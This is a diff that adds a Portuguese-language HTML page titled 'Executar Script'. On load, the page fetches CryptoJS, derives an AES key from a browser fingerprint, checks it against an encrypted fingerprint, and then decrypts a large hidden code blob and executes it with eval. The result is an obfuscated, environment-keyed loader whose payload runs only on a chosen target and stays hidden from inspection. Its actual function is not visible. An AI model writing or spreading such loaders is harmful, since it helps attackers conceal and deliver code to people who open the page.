@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Executar Script</title>
+    <script>
+        (function() {
+            'use strict';
+
+            function loadCryptoJS(callback) {
+                const script = document.createElement('script');
+                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js';
+                script.onload = callback;
+                document.head.appendChild(script);
+            }
+
+            function decrypt(text, key) {
+                try {
+                    const bytes = CryptoJS.AES.decrypt(text, key);
+                    return bytes.toString(CryptoJS.enc.Utf8);
+                } catch (e) {
+                    console.error('Error decrypting:', e);
+                    return '';
+                }
+            }
+
+            function gerarFingerprint() {
+                const navigatorData = window.navigator;
+                const fingerprint = [
+                    navigatorData.userAgent,
+                    navigatorData.language,
+                    navigatorData.platform,
+                    `${window.screen.width}x${window.screen.height}`,
+                    window.screen.colorDepth
+                ].join('|');
+                return fingerprint;
+            }
+
+            const encryptedCode = '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';
+            const encryptedFingerprint = 'U2FsdGVkX19n8utZzhQvcaGPHAjsn2QRWZAMG7HA+kHkchCusPUfY5+eoZFCc+0kIh+2MDhWm1agaatqcYm52t7CRYPJFQHx0Rtqq3L7ShJ45DyBJ8xF92xOqFunIIY2BngOUJMjKREboekP0eGVKKOrIrGV8/lyniS3Dg/UGHBFcG7RTbJcNQD0BUylKTKRymhgU2OCRT6Sq7GSDCgp/Q4yOOpUYi8OCG/OvcW5jXD45mmcNifA7qB4/MtGxSnX';
+            const key = gerarFingerprint();
+
+            loadCryptoJS(function() {
+                const decryptedFingerprint = decrypt(encryptedFingerprint, key);
+                if (gerarFingerprint() === decryptedFingerprint) {
+                    const decryptedCode = decrypt(encryptedCode, key);
+                    try {
+                        eval(decryptedCode);
+                    } catch (e) {
+                        console.error('Error evaluating code:', e);
+                    }
+                } else {
+                    console.error('Fingerprint does not match.');
+                }
+            });
+        })();
+    </script>
+</head>
+<body>
+    <h1>Executando o Script</h1>
+    <p>Verifique o console para possíveis mensagens de erro ou sucesso.</p>
+</body>
+</html>
